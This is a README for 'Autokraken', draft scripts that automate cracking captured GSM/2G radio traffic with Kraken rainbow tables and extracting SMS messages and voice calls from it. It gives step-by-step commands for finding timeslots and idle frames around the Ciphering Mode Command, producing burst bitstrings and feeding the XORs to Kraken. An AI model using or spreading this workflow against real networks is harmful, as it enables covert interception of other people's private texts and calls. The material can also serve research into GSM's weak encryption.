# Autokraken

_Warning: those are currently dirty drafts.  It works for us but would need to be heavily reviewed to work any other platform._

A set of scripts to automate the cracking of captured GSM/G2 network traffic with Kraken, and to extract SMS and voice calls out of it.  This is not frequency hopping capable.

## Requirements

Few command line utilities

        which sed
        which awk
        which grep
        which cut
        which wc

Few packages

        apt install python3 tcpdump tshark gr-gsm -y

Optionally `gsmframedecoder` when dealing with SI5 instead of idling frames, but then you would also need the legacy Airprobe code to get the HEX version of the bursts

And of course Kraken with ready to serve rainbow table indexes

## Stage 1

Seeking for idle frames

	cd stage1/
        cfile=/root/capture/66.hrf.cfile
        arfcn=66

Extract the timeslot (TODO: and subchannel) from Immediate Assignments


        ./json0C $cfile $arfcn
	ls -lF ${cfile}.0C.json

        ./parse.py 0C ${cfile}.0C.json

        slot=1

Look for idling frames around the Ciphering Mode Command

	./jsonXS $cfile $arfcn $slot
	ls -lF $cfile.${slot}S.json

	./parse.py XS $cfile.${slot}S.json

	plainframe=816538

## Stage 2

	cd ../stage2/

Produce the burst bit strings

	./bitstringsXS $cfile $arfcn $slot
	ls -lF $cfile.${slot}S

Tune your path to Kraken and Utilities

        vi feedcrack.lib.bash

Generate the XORs

	#./getemptyframeplain $cfile.${slot}S $plainframe
	#./getemptyframecipher $cfile.${slot}S $plainframe
	./feedemptyframe $cfile.${slot}S $plainframe

